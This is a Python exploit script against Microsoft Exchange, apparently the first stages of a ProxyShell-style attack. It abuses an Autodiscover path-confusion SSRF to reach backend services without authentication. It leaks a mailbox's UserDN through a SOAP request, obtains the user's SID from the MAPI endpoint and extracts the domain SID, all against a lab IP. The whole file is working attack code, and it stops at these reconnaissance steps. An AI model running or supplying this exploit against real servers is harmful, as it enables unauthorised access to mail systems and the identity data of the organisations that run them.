import base64
import re
import xml.dom.minidom
import json
import uuid
import struct
import string
import random
import hashlib
import time
import urllib
import sys
import warnings

warnings.filterwarnings("ignore")
warnings.filterwarnings("ignore", category=DeprecationWarning)

import requests

# proxies = {'https': 'http://127.0.0.1:8080'}

proxies = {}
session = requests.Session()

headers = {"Content-Type": "text/xml; charset=utf-8"}
base_url = "https://192.168.186.130/"
original_url = "/Autodiscover/Autodiscover.svc"
email_address = "test@exchange2016.com"


data_get_userdn = """<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:a="http://schemas.microsoft.com/exchange/2010/Autodiscover" 
        xmlns:wsa="http://www.w3.org/2005/08/addressing" 
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
        xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <a:RequestedServerVersion>Exchange2010</a:RequestedServerVersion>
    <wsa:Action>http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetUserSettings</wsa:Action>
    <wsa:To>https://mail.microsoft.com/autodiscover/autodiscover.svc</wsa:To>
  </soap:Header>
  <soap:Body>
    <a:GetUserSettingsRequestMessage xmlns:a="http://schemas.microsoft.com/exchange/2010/Autodiscover">
      <a:Request>
        <a:Users>
          <a:User>
            <a:Mailbox>%s</a:Mailbox>
          </a:User>
        </a:Users>
        <a:RequestedSettings>
          <a:Setting>UserDN</a:Setting>
        </a:RequestedSettings>
      </a:Request>
    </a:GetUserSettingsRequestMessage>
  </soap:Body>
</soap:Envelope>""" % (email_address)

def print_error_and_exit(error, r):
	print('[+] ', repr(error))
	if r is not None:
		print('[+] status_code: ', r.status_code)
		print('[+] response headers: ', repr(r.headers))
		print('[+] response: ', repr(r.text))
	raise Exception("exploit failed")

def post_request(original_url, headers={}, data = None, cookies = {}):
	headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
	cookies["email"] = "Autodiscover/autodiscover.json?SecurityToken1=rskvp93@gmail.com"
	url = base_url + "/Autodiscover/autodiscover.json?SecurityToken1=rskvp93@gmail.com" + original_url
	if data is not None:
		r = session.post(url, headers=headers, cookies=cookies, data=data, verify=False, proxies=proxies)
	else:
		r = session.get(url, headers=headers, cookies=cookies, verify=False, proxies=proxies)
	return r

print("[+] Send request to get UserDN")
r = post_request("/Autodiscover/Autodiscover.svc", headers, data_get_userdn)
if r.status_code == 200:
	doc = xml.dom.minidom.parseString(r.text);
	UserDN = doc.getElementsByTagName("UserSetting")[0].getElementsByTagName("Value")[0].firstChild.nodeValue
	UserDN = UserDN.encode('ascii')
	print("[+] Got UserDN of %s : %s" % (email_address, UserDN))
else:
	print_error_and_exit("get_userdn failed", r)

def get_sid(UserDN, email_address):
	headers = {'Content-Type': 'application/mapi-http',
				'X-Clientapplication': 'Outlook/15.0.4815.1002',
				'X-Clientinfo': '{2F94A2BF-A2E6-4CCC-BF98-B5F22C542226}',
				'X-Requestid': '{C715155F-2BE8-44E0-BD34-2960065754C8}:2',
				'X-Requesttype': 'Connect',
				'X-User-Identity': email_address }
	suffix = base64.b64decode("AAAAAADkBAAACQQAAAkEAAAAAAAA")
	data = UserDN + suffix
	print('[+] Send request to get sid')
	r = post_request("/mapi/emsmdb", headers, data)
	if r.status_code == 200:
		sid = re.search("with SID (.*) and MasterAccountSid", r.text).group(1)
		print('[+] Found sid of %s : %s' % (email_address, sid))
		# print '[+] Got sid success'
		return sid
	else:
		print_error_and_exit("get_sid failed", r)

def extract_domainid(sid):
	ret = re.search("S-1-5-21-(.*)-\\d+", sid)
	if ret is not None:
		domainid = ret.group(1)
		print("[+] Extract Domain ID success: ", domainid)
		return domainid
	else:
		return None

sid = get_sid(UserDN, email_address)
domain_sid = extract_domainid(sid)
print("[+] Got Domain ID : ", domain_sid)

